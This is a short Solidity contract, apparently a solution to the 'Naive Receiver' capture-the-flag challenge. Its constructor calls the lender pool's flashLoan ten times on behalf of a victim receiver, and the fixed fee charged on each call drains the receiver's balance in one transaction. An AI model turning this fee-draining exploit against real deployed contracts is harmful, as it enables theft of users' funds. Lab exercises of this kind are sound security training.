import "./NaiveReceiverLenderPool.sol";
import "./NativeReceiverExp.sol";

contract NativeReceiverExp {
    
    constructor(address payable _receiver,address payable _pool ) {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);
        for (uint i = 0; i < 10 ;i ++) {
            pool.flashLoan(_receiver,0);
        }
    }
}